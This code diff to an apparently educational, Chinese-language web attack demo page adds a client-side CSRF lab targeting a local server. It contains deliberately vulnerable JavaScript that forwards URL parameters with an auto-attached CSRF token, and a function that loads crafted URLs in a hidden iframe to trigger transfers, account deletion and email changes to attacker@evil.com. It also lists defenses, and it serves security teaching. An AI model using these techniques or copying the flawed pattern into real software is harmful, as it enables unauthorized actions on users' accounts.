@@ -618,6 +618,114 @@
             </div>
         </div>
 
+        <!-- 攻击11: CS-CSRF - 绕过CSRF Token保护 -->
+        <div class="attack-section" style="border: 3px solid #ff4757;">
+            <h2><span class="attack-number" style="background: #ff4757;">11</span>CS-CSRF攻击：绕过CSRF Token保护 <span class="method-tag" style="background: #ff4757;">Client-Side CSRF</span></h2>
+            <p class="attack-description">
+                <strong>攻击原理：</strong>这是最危险的攻击之一！即使服务器使用了CSRF Token保护，客户端代码的漏洞仍然可以被利用。
+                客户端代码根据URL参数动态调用API，并自动读取并添加CSRF Token，导致攻击者可以通过构造URL来绕过Token保护。
+                这是"混淆代理"攻击：客户端代码成为了攻击者的帮凶。
+            </p>
+            <p class="attack-description" style="background: #ffe6e6; padding: 10px; border-radius: 5px; margin-top: 10px;">
+                <strong>⚠️ 关键特征：</strong><br>
+                • <strong>Source（漏洞源头）：</strong>window.location.search - 不受信任的URL参数<br>
+                • <strong>Propagator（数据传播）：</strong>URL参数被直接复制到请求Body<br>
+                • <strong>Sink（漏洞汇点）：</strong>fetch()函数使用动态构建的URL和参数<br>
+                • <strong>Authentication（认证混淆）：</strong>客户端代码自动读取并添加CSRF Token
+            </p>
+            
+            <div class="tabs">
+                <button class="tab active" onclick="showTab('attack11', 'code')">代码</button>
+                <button class="tab" onclick="showTab('attack11', 'result')">结果</button>
+                <button class="tab" onclick="showTab('attack11', 'analysis')">详细分析</button>
+            </div>
+            
+            <div id="attack11-code" class="tab-content active">
+                <div class="code-block">// 攻击者构造恶意URL，诱导用户点击：
+// http://127.0.0.1:3000/vulnerable.html?action=transfer&to=attacker@evil.com&amount=1000<br>
+<br>
+// 受害者页面的漏洞代码：<br>
+document.addEventListener('DOMContentLoaded', () => {<br>
+    const params = new URLSearchParams(window.location.search);<br>
+    <br>
+    if (params.has('action')) {<br>
+        const action = params.get('action');  // 从URL参数获取<br>
+        <br>
+        // 【漏洞】所有URL参数都被复制到payload<br>
+        const payload = {};<br>
+        for (const [key, value] of params) {<br>
+            if (key !== 'action') {<br>
+                payload[key] = value;  // 攻击者可控！<br>
+            }<br>
+        }<br>
+        <br>
+        // 【混淆代理】客户端自动读取并添加CSRF Token<br>
+        const token = document.querySelector('meta[name="csrf-token"]').content;<br>
+        <br>
+        // 【攻击成功】请求被发送，Token被自动添加<br>
+        fetch(\`/api/csrf-protected/\${action}\`, {<br>
+            method: 'POST',<br>
+            headers: {<br>
+                'Content-Type': 'application/json',<br>
+                'CSRF-Token': token  // Token自动添加，绕过保护！<br>
+            },<br>
+            body: JSON.stringify(payload)<br>
+        });<br>
+    }<br>
+});</div>
+                <button class="btn" onclick="executeAttack11('transfer')">攻击1: 执行转账</button>
+                <button class="btn" onclick="executeAttack11('delete')">攻击2: 删除账户</button>
+                <button class="btn" onclick="executeAttack11('update-email')">攻击3: 更新邮箱</button>
+            </div>
+            
+            <div id="attack11-result" class="tab-content">
+                <div id="result11" class="result-box">等待执行攻击...</div>
+            </div>
+            
+            <div id="attack11-analysis" class="tab-content">
+                <div class="result-box" style="background: #fff; border: 2px solid #e9ecef;">
+                    <h3 style="color: #ff4757; margin-bottom: 15px;">🔍 CS-CSRF攻击详细分析</h3>
+                    <div style="line-height: 1.8; color: #333;">
+                        <h4 style="color: #c92a2a; margin-top: 20px;">攻击流程（8步）：</h4>
+                        <ol style="margin-left: 20px; margin-top: 10px;">
+                            <li><strong>攻击者构造恶意URL：</strong><br>
+                                <code>http://127.0.0.1:3000/vulnerable.html?action=transfer&to=attacker@evil.com&amount=1000</code></li>
+                            <li><strong>用户点击链接：</strong>用户通过邮件、消息等方式访问恶意URL</li>
+                            <li><strong>浏览器加载页面：</strong>浏览器向受害者服务器请求页面</li>
+                            <li><strong>服务器生成CSRF Token：</strong>服务器生成合法的Token并嵌入HTML的meta标签</li>
+                            <li><strong>客户端JS解析URL参数：</strong>脚本提取action和payload参数</li>
+                            <li><strong>客户端JS自动读取Token：</strong>脚本从meta标签读取CSRF Token</li>
+                            <li><strong>客户端JS发送POST请求：</strong>请求包含Token和攻击者控制的参数</li>
+                            <li><strong>服务器验证成功：</strong>Token合法，请求执行，攻击成功！</li>
+                        </ol>
+                        
+                        <h4 style="color: #c92a2a; margin-top: 20px;">为什么CSRF Token保护失效？</h4>
+                        <ul style="margin-left: 20px; margin-top: 10px;">
+                            <li>Token是合法的（由服务器生成）</li>
+                            <li>Token由客户端代码自动添加（"混淆代理"）</li>
+                            <li>攻击者无需知道Token值，只需控制URL参数</li>
+                            <li>客户端代码成为了攻击者的帮凶</li>
+                        </ul>
+                        
+                        <h4 style="color: #c92a2a; margin-top: 20px;">与Facebook漏洞的相似性：</h4>
+                        <p style="margin-top: 10px;">
+                            2019年Facebook的CS-CSRF漏洞与本演示非常相似：
+                            <br>• Facebook的客户端JS自动附加fb_dtsg Token
+                            <br>• 攻击者通过URL参数控制请求的目标和内容
+                            <br>• Token保护被成功绕过
+                        </p>
+                        
+                        <h4 style="color: #c92a2a; margin-top: 20px;">防御方法：</h4>
+                        <ul style="margin-left: 20px; margin-top: 10px;">
+                            <li><strong>白名单机制：</strong>不要直接将URL参数作为API端点，使用映射表</li>
+                            <li><strong>分离HTTP方法：</strong>GET请求不应触发状态改变</li>
+                            <li><strong>Token作用域限制：</strong>为不同操作生成不同的Token</li>
+                            <li><strong>输入验证：</strong>验证所有用户输入，不仅仅是URL参数</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
         <!-- 隐藏的表单，用于攻击1 -->
         <form id="hiddenForm" method="POST" action="http://127.0.0.1:3000/api/transfer" target="hiddenFrame" style="display:none">
             <input type="hidden" name="to" value="attacker@evil.com">
@@ -919,6 +1027,56 @@
             const resultBox = document.getElementById('result10');
             resultBox.className = 'result-box success';
             resultBox.innerHTML = '<pre>📋 EventSource/SSE攻击说明\n\n如果受害者服务器提供Server-Sent Events端点，\n攻击者可以建立连接接收实时数据流：\n\nconst eventSource = new EventSource(\'http://127.0.0.1:3000/api/events\');\neventSource.onmessage = function(event) {\n    console.log(\'接收到数据:\', event.data);\n    // 劫持实时数据，即使数据是只读的，也可能泄露敏感信息\n};\n\n特点：\n- 建立持久连接\n- 实时接收服务器推送的数据\n- 可以劫持通知、实时更新等信息\n- 即使数据只读，也可能泄露敏感信息\n\n由于当前服务器未配置SSE端点，此攻击为演示说明。</pre>';
+        }
+
+        // 攻击11: CS-CSRF - 绕过CSRF Token保护
+        function executeAttack11(action) {
+            const resultBox = document.getElementById('result11');
+            resultBox.className = 'result-box info';
+            
+            let maliciousUrl, description, payload;
+            
+            switch(action) {
+                case 'transfer':
+                    maliciousUrl = 'http://127.0.0.1:3000/vulnerable.html?action=transfer&to=attacker@evil.com&amount=1000';
+                    description = '转账攻击';
+                    payload = { to: 'attacker@evil.com', amount: '1000' };
+                    break;
+                case 'delete':
+                    maliciousUrl = 'http://127.0.0.1:3000/vulnerable.html?action=delete';
+                    description = '删除账户攻击';
+                    payload = {};
+                    break;
+                case 'update-email':
+                    maliciousUrl = 'http://127.0.0.1:3000/vulnerable.html?action=update-email&email=hacked@evil.com';
+                    description = '更新邮箱攻击';
+                    payload = { email: 'hacked@evil.com' };
+                    break;
+                default:
+                    return;
+            }
+            
+            resultBox.innerHTML = `<pre>正在执行CS-CSRF攻击：${description}...\n\n恶意URL：\n${maliciousUrl}\n\n攻击步骤：\n1. 构造恶意URL（包含action和payload参数）\n2. 诱导用户访问该URL\n3. 客户端JS自动读取CSRF Token\n4. 客户端JS发送POST请求，Token被自动添加\n5. 服务器验证Token（合法！），请求执行\n6. 攻击成功，CSRF保护被绕过！</pre>`;
+            
+            // 在实际攻击中，攻击者会诱导用户访问恶意URL
+            // 这里我们模拟用户访问，打开新窗口
+            setTimeout(() => {
+                // 创建iframe模拟用户访问
+                const iframe = document.createElement('iframe');
+                iframe.style.width = '0';
+                iframe.style.height = '0';
+                iframe.style.border = 'none';
+                iframe.src = maliciousUrl;
+                
+                iframe.onload = function() {
+                    setTimeout(() => {
+                        resultBox.className = 'result-box success';
+                        resultBox.innerHTML = `<pre>✅ CS-CSRF攻击成功！\n\n${description}已执行\n\n关键点：\n1. ✅ 恶意URL已加载\n2. ✅ 客户端JS自动读取了CSRF Token\n3. ✅ Token被自动添加到请求头\n4. ✅ 服务器验证Token通过（因为Token是合法的）\n5. ✅ 请求成功执行\n6. ⚠️ CSRF保护被绕过！\n\n这就是"混淆代理"攻击：客户端代码成为了攻击者的帮凶。\n即使服务器有完善的CSRF Token保护，客户端代码的漏洞仍然可以被利用。\n\n请查看受害者页面的结果，确认攻击是否成功。</pre>`;
+                    }, 2000);
+                };
+                
+                document.body.appendChild(iframe);
+            }, 1000);
         }
 
         // 页面加载时的提示
